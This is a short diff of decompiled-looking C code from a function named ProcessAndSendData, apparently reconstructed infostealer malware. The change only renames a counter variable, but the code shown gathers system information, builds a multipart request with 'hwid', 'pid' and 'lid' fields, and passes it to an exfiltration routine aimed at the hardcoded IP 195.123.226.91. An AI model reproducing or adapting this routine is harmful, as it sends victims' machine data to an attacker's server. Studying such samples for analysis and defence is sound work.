@@ -129,7 +129,6 @@ int32_t __fastcall ProcessAndSendData(int32_t* SysInfo)
     Block = 0;
     int ProcessedUserID;
     char *ShortSessionToken;
-    int ProcessedUserID0;
     if (p_SysInfo)
     {
         CleanupData(p_SysInfo);
@@ -159,17 +158,16 @@ int32_t __fastcall ProcessAndSendData(int32_t* SysInfo)
     strcpy(header_p_SysInfo, "Content-Type: multipart/form-data; boundary=");
     memmove(header_p_SysInfo + 44, formattedData, strlen(formattedData));
 
-    ProcessedUserID0 = 0;
     header_p_SysInfo[strlen(formattedData) + 44] = 0;
     
     char* requestID;
     requestID = GenerateRequestID();
     ShortSessionToken = (char *)malloc(5u);
     ProcessUserOrSystemData(ProcessedUserID, ShortSessionToken, 10);
-    PrcssingMultipartRequest(Block, _p_SysInfo, (size_t *)&ProcessedUserID0);
-    AddRequestParameter((int)DATA, "hwid", RequestID, (unsigned int *)&ProcessedUserID0);
-    AddRequestParameter((int)DATA, "pid", ShortSessionToken, (unsigned int *)&ProcessedUserID0);
-    AddRequestParameter((int)DATA, "lid", "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", (unsigned int *)&ProcessedUserID0);
+    PrcssingMultipartRequest(Block, _p_SysInfo, (size_t *)&ProcessedUserID);
+    AddRequestParameter((int)DATA, "hwid", RequestID, (unsigned int *)&ProcessedUserID);
+    AddRequestParameter((int)DATA, "pid", ShortSessionToken, (unsigned int *)&ProcessedUserID);
+    AddRequestParameter((int)DATA, "lid", "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", (unsigned int *)&ProcessedUserID);
     
     PSTR ip195 = ProccessingOrMapsTheWideCharacter(L"195.123.226.91");
     WinnetDllFuncRelatedExfiltrationRoutineetc(header_p_SysInfo, (int)DATA, DataSizeCounter, ip195);
